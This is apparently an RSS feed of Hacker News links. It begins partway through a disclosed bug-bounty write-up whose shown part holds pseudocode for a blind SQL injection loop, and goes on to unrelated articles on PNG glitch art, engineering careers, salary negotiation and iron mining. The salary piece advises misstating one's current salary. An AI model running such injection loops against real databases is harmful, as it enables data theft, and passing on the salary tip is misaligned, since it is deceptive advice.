      <span>inject</span> <span>sqlInjection</span> <span>is</span> <span>POST</span> <span>request</span> <span>body</span>
      <span>if</span> <span>response</span><span>.</span><span>status</span> <span>==</span> <span>200</span><span>:</span>
        <span>result</span> <span>+=</span> <span>character</span>
        <span>recurse</span> <span>function</span> <span>with</span> <span>characterPosition</span><span>++</span>
      <span>elif</span> <span>response</span><span>.</span><span>status</span> <span>==</span> <span>500</span><span>:</span>
        <span>continue</span> <span>with</span> <span>next</span> <span>character</span> <span>in</span> <span>alphabet</span>

      <span>return</span> <span>result</span></code></pre></figure>

<p>And this is how I bypassed Cloudflare WAF’s SQL injection protection. I got a
free t-shirt and a place in <a href="https://hackerone.com/gskourou">Cloudflare’s HoF</a>.</p>

<h4 id="mitigation">Mitigation</h4>
<p>Cloudlfare reviewed and fixed the vulnerability a few days after my report.</p>
<p>The safest way to mitigate SQL injections on your databases is prepared
statements. These come in most database interaction libraries for most
languages. You can find a full list of ways to mitigate SQL injections at
<a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP</a>.
It is my opinion that if developers take good care to apply security measures
on their applications, WAFs are most of the times unnecessary. All you need to
do is sanitize the users’ input properly.</p>


        </section>

        

        

    </article>

</div></div>]]>
            </description>
            <link>https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520556</guid>
            <pubDate>Fri, 18 Sep 2020 18:52:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Art of PNG Glitch]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24520201">thread link</a>) | @pmoriarty
<br/>
September 18, 2020 | https://ucnv.github.io/pnglitch/ | <a href="https://web.archive.org/web/*/https://ucnv.github.io/pnglitch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <header>
      <a title="PNGlitch" href="https://github.com/ucnv/pnglitch/"><img src="https://ucnv.github.io/pnglitch/files/forkme.png" alt="PNGlitch"></a>
      
    </header>
    <section>
      <h2>Overview</h2>
      <p>
      PNG is an image format that has a history of development beginning in 1995, and it is still a popular, long living format. Generally, it is known for its features such as lossless compression and  the ability to handle transparent pixels. <br>
      However, we do not look at image formats from a general point of view, but rather think of ways to glitch them. When we look at PNG from the point of view of glitch, what kind of peculiarity does it have?
      </p>
      <h3>Checksum</h3>
      <p>
      We should first look into the checksum system of the CRC32 algorithm. It is used to confirm corrupted images, and when it detects corruption in an image file, normal viewer applications refuse to display it. Therefore, it is impossible to generate glitches using simple methods such as rewriting part of the binary data using text editors or binary editors (you will completely fail). In other words, the PNG format is difficult to glitch. <br>
      We need to create glitches accordingly to the PNG specification in order to avoid this failure. This means that we must rewrite the data after decoding CRC32, re-calculate it and attach it to the edited data.
      </p>

      <h3>State</h3>
      <p>
      Next we want to look at the transcode process of PNG. The chart shown below is a simplified explanation of how PNG encoding flows.
      </p>
      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/states.png" alt="Figure 1)  PNG encoding flow">
        <figcaption>Figure 1) PNG encoding flow</figcaption>
      </figure>


      <p>
      Each of the four states that are shown above can be glitch targets. However, glitching the the first “Raw Data” is the same as glitching BMP, so it technically isn’t a PNG glitch (at the end, it is the same as PNG with the None filter applied. I will explain this in the next section). The final “Formatted PNG” glitch will not work because of the checksum system I mentioned above.<br>
      This means that PNG glitches can be made when the “Filtered Data” or “Compressed Data” is manipulated. I will explain about filters in the following subsection. When “Filtered Data” is glitched, it shows a distinctive effect; patterns that look like flower petals scatter around the image. The difference between the filters become clear when the “Filtered Data” is glitched. On the other hand, “Compressed Data” glitches are flavored by their own compression algorithm, which is Deflate compression. It shows an effect similar to a snow noise image.
      </p>
      <p>
      There are elements else besides the transcoding process that could also influence the appearance of glitches such as transparent pixels and interlaces.
      </p>
      <h3>Five filters</h3>
      <p>
      The factor that characterizes the appearance of glitches the most is the process called filter. The filter converts the uncompressed pixel data of each scanline using a certain algorithm in order to improve the compression efficiency. There are five types of filters that include four algorithms called Sub, Up, Average and Paeth, and also None (which means no filter applied). PNG images are usually compressed after the most suitable filter is applied to each scanline, and therefore all five filters are combined when PNG images are made.<br>
      These five filters usually only contribute to the compression efficiency, so the output result is always the same no matter which filter is applied. However, a clear difference appears in the output result when the filtered data is damaged. It is difficult to recognize the difference of the filters when an image is optimized and has all five filters combined, but the difference becomes obvious when an image is glitched when the same, single filter is applied to each scanline.<br>
      I will show the difference of the effect that each filter has later on, but when we look close into the results, we will understand which filter is causing which part of the beauty of PNG glitches (yes, they are beautiful) to occur.
      </p>
      <p>
        I will show the actual glitch results in the next section.
      </p>

      <h2>Glitching: In practice</h2>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png.png" alt="Figure 2) Original PNG image"></a>
        <figcaption>Figure 2) Original PNG image</figcaption>
      </figure>
      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-optimized.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-optimized.png" alt="Figure 3) Glitched PNG image"></a>
        <figcaption>Figure 3) Glitched PNG image</figcaption>
      </figure>
      <p>
      I have shown two PNG images above: one is an image before it has been glitched, and one is an image that has been glitched.<br>
      This is a Filtered Data glitch, which I explained in the previous section.<br>
      The original PNG has optimized filters applied to each scanline, and all of the five filters have been combined. The glitch reveals how the five filters were balanced when they were the combined.
      </p>
      <h3>Difference between filters</h3>
      <p>
      Lets look into the difference between each filter type.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-none.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-none.png" alt="Figure 4) Glitched PNG, filtered with None"></a>
        <figcaption>Figure 4) Glitched PNG, filtered with None</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-none-detail.png" alt="Figure 5) Magnified view of fig. 4">
        <figcaption>Figure 5) Magnified view of fig. 4</figcaption>
      </figure>
      <p>
      The image above has applied “None (no filter)”, meaning that it is a raw data glitch. Each pixel stands alone in this state and do not have any relationship with the others, so a single re-wrote byte does not have a wide range influence.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-sub.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-sub.png" alt="Figure 6) Glitched PNG, filtered with Sub"></a>
        <figcaption>Figure 6) Glitched PNG, filtered with Sub</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-sub-detail.png" alt="Figure 7) Magnified view of fig. 6">
        <figcaption>Figure 7) Magnified view of fig. 6</figcaption>
      </figure>
      <p>
      This is a glitched image that has the filter “Sub” applied to each scanline. When the Sub algorythm is applied, the target pixel rewrites itself by refering to the pixel that is right next to it. This is why the glitch pattern avalanches towards the right side.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-up.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-up.png" alt="Figure 8) Glitched PNG, filtered with Up"></a>
        <figcaption>Figure 8) Glitched PNG, filtered with Up</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-up-detail.png" alt="Figure 9) Magnified view of fig. 8">
        <figcaption>Figure 9) Magnified view of fig. 8</figcaption>
      </figure>
      <p>
      This is the filter “Up”. This filter is similar to Sub, but its reference direction is the top and bottom.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-average.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-average.png" alt="Figure 10) Glitched PNG, filtered with Average"></a>
        <figcaption>Figure 10) Glitched PNG, filtered with Average</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-average-detail.png" alt="Figure 11) Magnified view of fig. 10">
        <figcaption>Figure 11) Magnified view of fig. 10</figcaption>
      </figure>
      <p>
      The filter “Average” refers to a diagonal direction. It shows a meteor like tail that starts from the damaged pixel. The soft gradation effect is also one of the peculiarities of this filter. The result of a PNG glitch when the Average filter is applied is a glitch that lacks glitchiness, and is also the most delicate portion of PNG glitching.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-paeth.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-paeth.png" alt="Figure 12) Glitched PNG, filtered with Paeth"></a>
        <figcaption>Figure 12) Glitched PNG, filtered with Paeth</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-paeth-detail.png" alt="Figure 13) Magnified view of fig. 12">
        <figcaption>Figure 13) Magnified view of fig. 12</figcaption>
      </figure>
      <p>
      The filter “Paeth” has the most complicated algorithm when compared with the others. It also has the most complicated glitch effect. The glitch will affect a wide range of areas even with the least byte re-writing. The keynote effect of PNG glitch is caused by this filter; the figure shown in the original image is maintained, but is intensely destroyed at the same time.
      </p>

      <h3>Glitch after compression</h3>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-compressed.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-compressed.png" alt="Figure 14) Glitched PNG, after compressed"></a>
        <figcaption>Figure 14) Glitched PNG, after compressed</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-compressed-detail.png" alt="Figure 15) Magnified view of fig. 14">
        <figcaption>Figure 15) Magnified view of fig. 14</figcaption>
      </figure>
      <p>
      This is a glitch of the state that I referred to as Compressed Data in the previous section. A snowstorm effect appears, and it is difficult to recognize the original figure in the image. It infrequently remains to show effects of the filters. The image is often completely destroyed.
      </p>
　
      <h3>Transparence</h3>
      <p>
      Lets look into what happens when an image that includes transparent pixels is glitched.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-alpha.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-alpha.png" alt="Figure 16) Original PNG image"></a>
        <figcaption>Figure 16) Original PNG image with alpha pixels</figcaption>
      </figure>
      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-alpha.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-alpha.png" alt="Figure 17) Glitched PNG, with alpha pixels"></a>
        <figcaption>Figure 17) Glitched PNG, with alpha pixels</figcaption>
      </figure>
      <p>
      The transparency comes as an effect. Especially the filter “Average” seems to blend transparent pixels gradually.
      A 100% gathering of transparent pixels is handled in the same way as a solid colored section. You can tell that the filter “Up” is often applied to solid colored sections.<br>
      (There is a possibility that newer general-purpose image formats switch their compression scheme of each part depending on if the image is a solid colored section, or else a complicated image such as photographs. The use of images that include solid colored sections for testing glitches is an effective method. One example is a WebP. )
      </p>

      <h3>Interlace</h3>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-interlace.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-interlace.png" alt="Figure 18) Glitched PNG, with interlace"></a>
        <figcaption>Figure 18) Glitched PNG, with interlace</figcaption>
      </figure>
      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-interlace-detail.png" alt="Figure 19) Magnified view of fig. 18">
        <figcaption>Figure 19) Magnified view of fig. 18</figcaption>
      </figure>
      <p>
        PNG interlaces are divided into seven passes, using the Adam7 algorithm based on 8x8 pixels. We are able to visualy observe that algorithm when an interlaced PNG is glitched. We can also confirm a stitched effect, and that its angle has become narrow towards the Average filter (see appendix B).
      </p>

      <h2>Conclusion</h2>
      <p>
      PNG is a very simple format compared to JPEG or other new image formats. The filter algorithms are like toys, and its compression method is the same as oldschool Zip compression. However, this simple image format shows a surprisingly wide range of glitch variations. We would perhaps only need one example to explain a JPEG glitch, but we need many different types of samples in order to explain what a PNG glitch is.<br>
      PNG was developed as an alternative format of GIF. However, when it comes to glitching, GIF is a format that is too poor to be compared with PNG. PNG has prepared surprisingly rich results that have been concealed by the checksum barrier for a long time.
      </p>


      <hr>
    </section>
    <section>

      <h2><a name="appendix-a"></a>Appendix A: PNGlitch library</h2>
      <p>
      The author released <a href="http://www.jarchive.org/akami/aka018.html">a tiny script for PNG glitch</a> in 2010. Back then, it only removed the CRC32 and added it back again after the internal data was glitched.<br>
      Since then, the author has continued to rewrite the script and make improved versions of it for the purpose of using it in his own work, but he decided to make a library that adopts his know-how in 2014. The Ruby library <a href="https://github.com/ucnv/pnglitch">PNGlitch</a> came out as the result.<br>
      Every glitch image that appears in this article is made by using this …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ucnv.github.io/pnglitch/">https://ucnv.github.io/pnglitch/</a></em></p>]]>
            </description>
            <link>https://ucnv.github.io/pnglitch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520201</guid>
            <pubDate>Fri, 18 Sep 2020 18:26:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stop just using “Front end” or “Back end” to describe the Engineering you like]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24519400">thread link</a>) | @lord_sudo
<br/>
September 18, 2020 | https://www.michellelim.org/writing/stop-using-frontend-backend/ | <a href="https://web.archive.org/web/*/https://www.michellelim.org/writing/stop-using-frontend-backend/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p><strong><em>Also posted on Medium <a href="https://medium.com/@michlim97/stop-just-using-frontend-or-backend-to-describe-the-engineering-you-like-e8c392956ada">here</a>.</em></strong></p>
<p>
<img src="https://www.michellelim.org/writing/stop-using-frontend-backend/images/fe-be-cover-photo.png" alt="Stop Using Frontend Backend Cover Photo">
</p>
<p>If there is one tip I could share with my fellow new engineers, it would be… Stop relying on the “Frontend/Backend” axis to understand the engineering you like. <strong>The “Frontend/Backend” axis doesn’t map well to engineers’ motivations.</strong> If you only use that axis, you can end up in projects you don’t like or worse still, give up on engineering prematurely. <strong>Instead, try using the “Product/Infrastructure” axis as the first axis to understand your career preference.</strong></p>
<p>My goal is to share with you the language that could help you (and your manager) find your “sweet spot” engineering role. It took me a couple of bad internship placements and <em>pure luck</em> to figure this out. So I hope that this essay saves some of you months of job mismatch. Shoutout to <a href="https://twitter.com/bolu_ben">Bolu </a>who after my <a href="https://twitter.com/michlimlim/status/1293336552832151559">Tweet thread</a> on this thesis went viral on Tech Twitter, suggested that I turned the thread into an essay<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p>
<p><strong>“Product/Infra” maps neatly to the psychology of how engineers pick projects and their motivations for learning to code.</strong> Broadly speaking, there are 2 types of engineers<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>:</p>
<ol>
<li>
<p>“Product-first” engineers are obsessed with using code to solve a user problem and they see code as just a means to an end.</p>
</li>
<li>
<p>“Code-first” engineers are obsessed with the abstractions, architecture, tools and libraries in the code. Elegant code is the end.</p>
</li>
</ol>
<p>Product-first engineers map to “Product engineering”—building, launching and maintaining features that solve user problems. They often love being in the same room as designers and product managers to learn about users, and they love finding technical opportunities that can improve the product.</p>
<p>Code-first engineers map to “Infrastructure engineering”—building infrastructure platforms that support applications, be it via building CI/CD pipelines, implementing logging, or supporting high traffic etc. They’re motivated to better the craft of programming and are often obsessed with things like test coverage, using the latest technologies, code architecture, etc.</p>
<p>(To be clear, there are “Product engineering” and “Infrastructure engineering” roles whether your users are external customers, third-party developers or internal consumers of an API<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>.)</p>
<p>Notice that both Product engineers and Infrastructure engineers touch the frontend and the backend. Many of them, especially product engineers, choose to specialize into frontend or backend as well. <strong>The “Frontend/Backend” division is still a valuable axis.</strong></p>
<p><strong>However, using the “Frontend/Backend” in isolation of “Product/Infra” in project selection can lead to engineer-job Mismatch. Especially amongst Product engineers.</strong> I am a Product engineer. When I tried out “Backend engineering” in an internship, I was assigned to an Infra role where day-to-day I migrated databases. I had joined the company because I wanted to work on their product. But I didn’t have the language to explain that to my recruiter. They conflated “Backend” with “Infra” and I ended up with a role too far from the user.</p>
<p>When I tried out “Frontend engineering” in another internship, I was assigned to a product close to the user. But the frontend engineers and I were left out of the meetings that discussed how the features would solve problems.</p>
<p>If you split your engineers by the type of technology they work on (i.e. “Frontend/Backend”), it is easy to assume that your Frontend engineers are happy to just work on translating finalized designs into UI/UX components. But if you split them based on their motivations (i.e.”Product/Infra”), you’d want to loop your Frontend product engineers into product discussions.</p>
<p>(The same engineer-job mismatch happens for Infra engineers too, but it is less prevalent because the “Frontend” and “Backend” labels usually only officially apply in Product engineering.)</p>
<p>Now, this next part may be a reach… but I think <strong>many new grad Product engineers choose to be Product <em>Managers</em></strong> <strong>because of this inadequate “Frontend/Backend” division</strong><sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>. Let’s jump back to my two internship examples. How would you feel if these were your only two internships over your college career? Given that you spent 12 weeks in each role, wouldn’t it be reasonable to conclude that those roles were mostly what “frontend” and “backend” were all about? Wouldn’t it be reasonable too to conclude that since you didn’t like both types of engineering, maybe engineering as a whole wasn’t for you? (And this self-dejection is especially easy to fall into if you are part of an underrepresented minority in engineering.) Why not be a <em>Product</em> manager and solve user problems?</p>
<p>This scenario is very common. Engineering is esoteric. Even with an intern-team matching process, an Product engineering intern may not know that they should select Product engineering roles, let alone know which roles are Product engineering roles.</p>
<p><strong>But what if that same intern uses the “Product/Infra” language and advocates for a “Product Engineering” role?</strong></p>
<p>I was such an intern. I was so drained by my Infra role that I reached out to Product Managers in the company to enquire about their jobs. But then I advocated<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> for a Product Engineering role and… my manager gave it to me. As a backend engineer on a product team, I worked with a team to <a href="https://techcrunch.com/2019/10/03/stock-trading-app-robinhood-revamps-its-newsfeed-with-the-wall-street-journal-and-ad-free-videos/">build the Video Newsfeed in Robinhood</a>. I built a large backend pipeline and also had the chance to engage with product questions regarding newsfeed ranking, video tagging, and user engagement. I spoke with engineering, data science, and business, balanced those interests, and wrote the resolution in code.</p>
<p>I found my sweet spot.</p>
<p><strong>At the end of the day, engineering is multifaceted and can be defined along more than one axis:</strong> B2B vs. B2C, B2B top-down vs. B2B “bottom-up”, API-first vs. application-first, “Forward deployed” vs. “Software engineer”, etc. If we’re serious about making engineering accessible to all, we should champion any and all frameworks that can help new engineers find their sweet spot and be happy.</p>
<!-- raw HTML omitted -->
<h3 id="notes">Notes</h3>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>I had met Bolu, a new grad in Bloomberg London, after he sent me a cold DM to thank me for the thread. He had sent my thread to his manager!!! It turned out that he had been struggling to express his project preferences to his manager, and the thread helped. The manager “got” it after reading the thread and now Bolu is on a product development team he is very excited about. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>I took the “code-first” vs. “product-first” engineer terminology from Xoogler Zach Lloyd’s blog: <a href="https://thezbook.com/">https://thezbook.com/</a> <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p>Someone on Twitter (leon @lievetraz) replied with their attempt to classify internal tools teams into “Product/Infra” <a href="https://twitter.com/lievetraz/status/1293555767430336518?s=20">here</a>. <a href="#fnref:3" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:4" role="doc-endnote">
<p>There are hundreds of other reasons engineers choose to be PMs of course. <a href="#fnref:4" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:5" role="doc-endnote">
<p>I learned it the hard way how important it was to advocate for oneself and ask to change teams early. <a href="#fnref:5" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

		</div></div>]]>
            </description>
            <link>https://www.michellelim.org/writing/stop-using-frontend-backend/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519400</guid>
            <pubDate>Fri, 18 Sep 2020 17:19:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Negotiate Your Salary as a Developer]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518792">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://catalins.tech/how-to-negotiate-your-salary-as-a-developer | <a href="https://web.archive.org/web/*/https://catalins.tech/how-to-negotiate-your-salary-as-a-developer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1597245333467/5UNrmc9eH.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><hr>

<p>Knowing how to negotiate your salary as a developer is a must. When I received my first job offer, I was so excited to get a job, that I blindly accepted it. I did not even think of negotiating the salary. After all, I did not want to risk losing the offer. You have been in the same situation at least once, right?</p>
<p>However, most of the time, we leave money on the table by not negotiating our salary.</p>

<p>The first offer is never the best or the final offer. Companies always leave room in case the candidate wants to negotiate it. By not negotiating, you leave money on the table.</p>
<p>But how should I know how much to ask for? Use websites like Glassdoor to find the appropriate salary for a similar position and a similar experience. Once you have this information, adjust the salary based on your circumstances. At this point, you should have a rough idea of how much you deserve.</p>
<p>However, you should not blindly ask for more without reasons. If you ask for money, come with reasons why you deserve that compensation. Specify what you bring to the table.</p>

<p>I think I received this question millions of times. First of all, in many countries and states (USA), it is illegal to ask for the current salary. The rule of thumb is never to specify the salary you are making.</p>
<p>There are two options when answering this question:</p>
<ol>
<li>Avoid the question and try to move on</li>
<li>If they keep insisting, use the salary you want as your “current salary.”
Anyway, the best thing is never to mention the current salary. Companies and recruiters should not care about your current situation in terms of salary. </li>
</ol>

<p>Another reason why people do not negotiate is that they are afraid the company rescinds the offer. I do not think any respectable company is going to revoke the offer if you negotiate the salary.</p>
<p>In the worst case, they are going to cancel the offer. However, would you like to work for a company that does this? You just saved yourself from the trouble.</p>
<p>Therefore, do not be afraid to negotiate. In the worst case, they are going to say ‘no’. In the best case, you are going to get better compensation. On the other hand, if they rescind the offer, you do not want to work for them anyway.</p>

<p>This advice is not actionable straight away, and it depends on the circumstances. However, having alternative offers helps a lot because it puts you in a favourable position. If your negotiation does not go well, you always have a second option. The company also knows that you have nothing to lose.</p>
<p>However, I want to repeat that it depends on the circumstances. The more offers you have, the better it is for you. One the other side, if you do not have multiple offers, it is not the end of the world. </p>
<p>Let us pretend you have alternative offers. How can you use them to leverage your position?</p>
<p>You could say something along these lines: “I have multiple offers from x, y, z with better compensation. However, I like your products and your mission the most. As a result, I would like to work here because I think it is a better fit for me.” Of course, this is just an example, but you can use something similar.</p>
<p>Thus, if you have other offers, learn how to use them at your advantage.</p>

<p>These are my tops tips when it comes to knowing how to negotiate your salary as a developer. The list is not exhaustive, and there are many other aspects of negotiating.</p>
<p>I hope the article gives you some insights and helps you see negotiating with other eyes. The essential thing is to negotiate your salaries. Otherwise, you leave money on the table.</p>
<blockquote>
<p>If you enjoyed the article, consider sharing it so more people can benefit from it! Also, feel free to @ me on Twitter with your opinions.</p>
</blockquote>
</div></div></section></div></div>]]>
            </description>
            <link>https://catalins.tech/how-to-negotiate-your-salary-as-a-developer</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518792</guid>
            <pubDate>Fri, 18 Sep 2020 16:28:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Z80, the 8-bit Number Cruncher (2011)]]>
            </title>
            <description>
<![CDATA[
Score 59 | Comments 51 (<a href="https://news.ycombinator.com/item?id=24518158">thread link</a>) | @elvis70
<br/>
September 18, 2020 | http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html | <a href="https://web.archive.org/web/*/http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518158</guid>
            <pubDate>Fri, 18 Sep 2020 15:39:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: ugit – Learn Git Internals by Building Git in Python]]>
            </title>
            <description>
<![CDATA[
Score 223 | Comments 23 (<a href="https://news.ycombinator.com/item?id=24517925">thread link</a>) | @nikital
<br/>
September 18, 2020 | https://www.leshenko.net/p/ugit/ | <a href="https://web.archive.org/web/*/https://www.leshenko.net/p/ugit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <p>Loading...</p>
    <section>
        
        
        
    </section>

    <section>
        
        
        <details>
            <summary>Download</summary>
            <p><span>Clone μgit using:</span>
                <span id="clone-cmd"></span>
                

                <span>Checkout this commit:</span>
                <span id="checkout-cmd"></span>
                
            </p>
        </details>
    </section>

    

    

    

    


</div>]]>
            </description>
            <link>https://www.leshenko.net/p/ugit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517925</guid>
            <pubDate>Fri, 18 Sep 2020 15:22:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Iron, How Did They Make It? Part I, Mining]]>
            </title>
            <description>
<![CDATA[
Score 221 | Comments 44 (<a href="https://news.ycombinator.com/item?id=24517792">thread link</a>) | @dddddaviddddd
<br/>
September 18, 2020 | https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This week we are starting a four-part look at pre-modern iron and steel production.  As with our series on farming, we are going to follow the train of iron production from the mine to a finished object, be that a tool, a piece of armor, a simple nail, a weapon or some other object.  <strong>And I want to stress that broad framing</strong>: iron was made into more things than <em>just</em> swords (although swords are cool).  If you are here wondering how you go from iron-bearing rocks to a sword, these posts will tell you, but they will equally get you from those same rocks to a nail, or a workman’s hammer, or a sawblade, or a pot, or a decorative iron spiral, or a belt-buckle, or any other of a multitude of things that might be produced in iron.</p>



<p>Iron production is a unique topic in one key way.  If the problem with <a href="https://acoup.blog/2020/07/24/collections-bread-how-did-they-make-it-part-i-farmers/">farmers </a>is that the popular understanding of the past (either historical or fantastical) renders them <a href="https://acoup.blog/2019/07/12/collections-the-lonely-city-part-i-the-ideal-city/">effectively invisible</a> – as indeed, it tends to render <em>most</em> ancient forms of production invisible – <strong>iron-working is tremendously visible, but in a series of motifs that are almost completely</strong> <em><strong>wrong</strong></em>.  Iron is treated as rare when it is common, melted in societies that almost certainly lack the furnaces to do so; swords are cast when they should be forged, quenched in ways that would ruin them and the work of the iron-worker is represented as a solitary activity when every stage of iron-working, when done at any kind of scale, was a team job (many modern traditional blacksmiths work alone, often as a hobby; ancient smiths generally did not).  The popular depiction is so consistently wrong that it doesn’t really even provide a firm basis for correction.  <strong>We are going to have to start over, from the beginning</strong>.</p>



<p><strong>So this first post is going to focus on mining</strong>.  Next week we’ll take a look at ore processing, smelting in more detail, along with the pressing issue of fuel.  The week after that we’ll look at the basic principles behind forging.  And finally in the last week, we’ll ask what one might do if they wanted <em>steel</em> instead of iron.  As with the farming posts, there are likely to be some addendum (at least one, on Wootz steel, for sure).  <strong>Throughout all of this, we are going to look not only at the processes by which these objects were produced, but also the people who did that production.</strong></p>



<figure><img data-attachment-id="4507" data-permalink="https://acoup.blog/saam-1910-9-11_1/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg" data-orig-size="800,480" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="saam-1910.9.11_1" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=800" src="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=800" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg 800w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=768 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption><a href="https://americanart.si.edu/artwork/iron-mine-port-henry-new-york-16373">Via the Smithsonian</a>, a painting of an iron mine by Homer Dodge Martin (c. 1862) at Port Henry, New York.  By the 1800s, increases demand for iron ore to fuel the industrial revolution had made larger underground iron mines more common.  Here you can actually see the tailings (rock with little or no iron content which is sorted out at the mine) littering the rock face down to the shore.</figcaption></figure>



